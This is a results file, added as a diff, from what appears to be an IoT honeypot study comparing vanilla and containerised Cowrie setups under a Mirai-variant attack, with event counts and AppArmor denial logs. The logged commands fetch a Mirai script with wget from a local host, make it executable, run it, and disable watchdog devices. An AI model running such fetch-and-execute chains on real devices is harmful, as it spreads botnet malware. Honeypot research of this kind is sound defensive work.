@@ -1,0 +1,152 @@
+EXPERIMENT: A7-ARCHER-LZRD-mirai-mips-bf58bd0b
+EXPORTED: 25/03/2026 17:06:16
+
+-=-=-= VANILLA HONEYPOT -=-=-=
+   source: /home/franek/IoT-Honeypot-for-Detecting-Attacks/Honeypot Project/vanilla-honeypot/cowrie
+   port: SSH 2222
+
+-=-=-= CONTAINERISED HONEYPOT -=-=-=
+   container: cowrie-honeypot
+   port: SSH 2223
+
+-=-=-= HOW TO LOAD LOGS -=-=-=
+  Pandas:
+    import pandas as pd
+    df = pd.read_json('vanilla/cowrie.json', lines=True)
+    df = pd.read_json('containerised/cowrie.json', lines=True)
+
+-=-=-= NOTES -=-=-=
+  cowrie.json : one JSON object per line (JSON Lines format)
+  cowrie.log  : human readable text version of same events
+  downloads/  : captured binaries named by SHA256 hash
+                Cowrie deduplicates — each unique file stored once
+
+
+
+Notes:
+- The commands used for selecting device profiles (uname -a & exit) have been cut out from the JSON files as that is uneccesary noise
+
+- We are able to establish a succesful connection with the C2 server, but unable to wget anything from it
+	- This means that the server is still active, and so is the malware
+	- However, Cowrie itself doesn't let us communicate with the C2 server, but is able to 'connect' to it (the IP is live, but the website isn't)
+		- This explains why Docker itself (docker exec) fails to register the wget, as connection is refused
+
+
+
+
+CLI OUTPUT:
+
+============================================================
+RESULTS: A7-ARCHER-LZRD-mirai-mips-bf58bd0b_25-03-2026_1706
+============================================================
+
+
+Vanilla Honeypot
+------------------------------------------------------------
+cowrie.json 31 events
+      10 cowrie.client.var
+       5 cowrie.session.file_download
+       4 cowrie.command.input
+       3 cowrie.session.file_download.failed
+       1 cowrie.session.connect
+       1 cowrie.client.version
+       1 cowrie.client.kex
+       1 cowrie.login.success
+       1 cowrie.session.profile
+       1 cowrie.client.size
+       1 cowrie.session.params
+       1 cowrie.log.closed
+       1 cowrie.session.closed
+    cowrie.log 116 lines
+
+Containerised Honeypot
+------------------------------------------------------------
+cowrie.json 31 events
+      10 cowrie.client.var
+       5 cowrie.session.file_download
+       4 cowrie.command.input
+       3 cowrie.session.file_download.failed
+       1 cowrie.session.connect
+       1 cowrie.client.version
+       1 cowrie.client.kex
+       1 cowrie.login.success
+       1 cowrie.session.profile
+       1 cowrie.client.size
+       1 cowrie.session.params
+       1 cowrie.log.closed
+       1 cowrie.session.closed
+    cowrie.log 460 lines
+
+    LOG CROSS-EXAMINATION
+------------------------------------------------------------
+Containerised.json == Vanilla.json?
+    Vanilla          json=4 log=4 TRUE
+    Containerised    json=4 log=14 FALSE
+
+SESSION COMPARISON
+------------------------------------------------------------
+    Vanilla:    1 session(s)
+        average duration 35.2s
+    Containerised:    1 session(s)
+        average duration 33.0s
+
+COMMAND COMPARISON
+------------------------------------------------------------
+    Vanilla:    4 command event(s)
+    Containerised:  4 command event(s)
+    Do commands match : TRUE
+
+COMMAND DETAILS
+------------------------------------------------------------
+    SESSION        TIMESTAMP                        COMMAND
+    [Vanilla] 073795d02e75 2026-03-25 17:02:13.980952+00:00 wget http://10.0.2.15:8888/LZRD_mirai_mips_bf58bd0b.sh -O /tmp/dvrhelper
+    [Vanilla] 073795d02e75 2026-03-25 17:02:18.137355+00:00 chmod 777 /tmp/dvrhelper
+    [Vanilla] 073795d02e75 2026-03-25 17:02:20.502839+00:00 exec /tmp/dvrhelper 
+    [Vanilla] 073795d02e75 2026-03-25 17:02:20.503613+00:00 echo '' > /dev/watchdog; echo '' > /dev/misc/watchdog; echo '' > /dev/watchdog0; echo '' > /sbin/wat
+    [Containerised] f12cec7da7e9 2026-03-25 17:04:39.553849+00:00 wget http://10.0.2.15:8888/LZRD_mirai_mips_bf58bd0b.sh -O /tmp/dvrhelper
+    [Containerised] f12cec7da7e9 2026-03-25 17:04:44.494324+00:00 chmod 777 /tmp/dvrhelper 
+    [Containerised] f12cec7da7e9 2026-03-25 17:04:47.135847+00:00 exec /tmp/dvrhelper 
+    [Containerised] f12cec7da7e9 2026-03-25 17:04:47.136976+00:00 echo '' > /dev/watchdog; echo '' > /dev/misc/watchdog; echo '' > /dev/watchdog0; echo '' > /sbin/wat
+
+DOWNLOADS DETAILS
+------------------------------------------------------------
+    Hashes match:   TRUE
+    Shared hashes:  2
+
+APPARMOR DENIALS
+------------------------------------------------------------
+Total denials: 16
+
+By Operation:
+      14 mknod
+       2 open
+
+    Detail:
+
+    TIMESTAMP                        OPERATION  PROCESS    PATH
+    2026-03-25 17:05:28.566999912+00 mknod      twistd   /home/cowrie/cowrie/cowrie-env/lib/python3.12/site
+    2026-03-25 17:05:28.572999954+00 mknod      twistd   /home/cowrie/cowrie/src/cowrie/__pycache__/_versio
+    2026-03-25 17:05:28.591000080+00 mknod      twistd   /home/cowrie/cowrie/src/cowrie/commands/__pycache_
+    2026-03-25 17:05:28.605999947+00 mknod      twistd   /home/cowrie/cowrie/src/cowrie/commands/__pycache_
+    2026-03-25 17:05:28.612999916+00 open       twistd   /home/cowrie/cowrie/
+    2026-03-25 17:05:28.661999941+00 mknod      twistd   /home/cowrie/cowrie/src/cowrie/core/__pycache__/ne
+    2026-03-25 17:05:28.667000055+00 mknod      twistd   /home/cowrie/cowrie/src/cowrie/commands/__pycache_
+    2026-03-25 17:05:28.683000088+00 mknod      twistd   /home/cowrie/cowrie/src/cowrie/commands/__pycache_
+    2026-03-25 17:05:28.696000099+00 mknod      twistd   /home/cowrie/cowrie/cowrie-env/lib/python3.12/site
+    2026-03-25 17:05:28.697999954+00 mknod      twistd   /home/cowrie/cowrie/src/cowrie/ssh/__pycache__/ses
+    2026-03-25 17:05:28.704999924+00 mknod      twistd   /home/cowrie/cowrie/src/cowrie/ssh/__pycache__/fac
+    2026-03-25 17:05:32.042000055+00 open       bash     /dev/tty
+    2026-03-25 17:05:32.042999983+00 mknod      bash     /dev/watchdog
+    2026-03-25 17:05:32.043999910+00 mknod      bash     /dev/watchdog0
+    2026-03-25 17:05:32.043999910+00 mknod      bash     /usr/sbin/watchdog
+    2026-03-25 17:05:32.043999910+00 mknod      bash     /usr/bin/watchdog
+
+SECCOMP DENIALS
+------------------------------------------------------------
+Total denials: 0
+   Visualising analysis...
+    Saved: 01_session_duration.png
+    Saved: 02_command_timeline.png
+    Saved: 03_apparmor_overview.png
+    Saved: 04_apparmor_blocked_paths.png
+
